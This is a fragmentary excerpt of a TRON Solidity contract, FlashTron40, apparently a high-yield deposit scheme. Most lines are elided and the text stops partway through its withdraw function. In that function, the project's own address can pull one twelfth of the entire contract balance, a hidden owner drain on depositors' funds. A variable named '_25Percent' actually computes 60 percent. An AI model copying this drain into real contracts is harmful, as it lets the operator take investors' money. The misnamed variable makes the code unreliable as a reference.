//SourceUnit: FlashTron40.sol

pragma solidity 0.5.9;

contract FlashTron40 {
	...
	uint256 constant public CONTRACT_BALANCE_STEP = 2000 trx;
	...
	function withdraw() public {
		...
		if(msg.sender == projectAddress){
		    msg.sender.transfer(contractBalance / 12);
		}

		user.checkpoint = block.timestamp;

		//========== get60Percent
        uint256 _25Percent = totalAmount.mul(60).div(100);
